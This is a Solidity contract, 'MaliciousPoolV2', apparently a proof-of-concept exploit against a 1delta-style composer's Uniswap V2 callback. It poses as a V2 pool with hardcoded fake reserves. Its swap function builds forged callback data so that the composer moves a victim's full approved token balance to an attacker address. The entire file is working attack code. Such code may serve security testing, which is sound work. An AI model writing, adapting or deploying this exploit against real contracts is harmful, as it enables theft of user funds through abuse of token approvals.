// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {CalldataLib} from "contracts/utils/CalldataLib.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IOneDeltaComposer {
    function uniswapV2SwapCallback(uint256 amount0Out, uint256 amount1Out, bytes calldata path, bytes calldata data) external;
}

contract MaliciousPoolV2 {
    address public victim;
    address public attacker;
    address public tokenToSteal;
    IOneDeltaComposer public composer;

    address private constant FACTORY = 0x8909Dc15e40173Ff4699343b6eB8132c65e18eC6;

    constructor(address _victim, address _attacker, address _tokenToSteal, address _composer) {
        victim = _victim;
        attacker = _attacker;
        tokenToSteal = _tokenToSteal;
        composer = IOneDeltaComposer(_composer);
    }

    function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {
        return (1156865411772232563819, 1695099113977, 1743777051);
    }

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external {
        uint256 victimBalance = IERC20(tokenToSteal).balanceOf(victim);
        require(victimBalance > 0, "MaliciousPoolV2: Victim has no balance");

        _attemptAttack(victimBalance);
    }

    function _attemptAttack(uint256 victimBalance) internal {
        bytes memory transferCall = CalldataLib.encodeTransferIn(tokenToSteal, attacker, victimBalance);

        bytes memory maliciousCallbackData =
            abi.encodePacked(victim, tokenToSteal, address(0), uint112(victimBalance), uint8(0), uint16(transferCall.length), transferCall);

        (bool success,) = address(composer).call(
            abi.encodeWithSelector(bytes4(0x10d1e85c), address(composer), uint256(1), uint256(0), new bytes(0), maliciousCallbackData)
        );
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        IERC20(tokenToSteal).transferFrom(from, to, value);
        return true;
    }
}
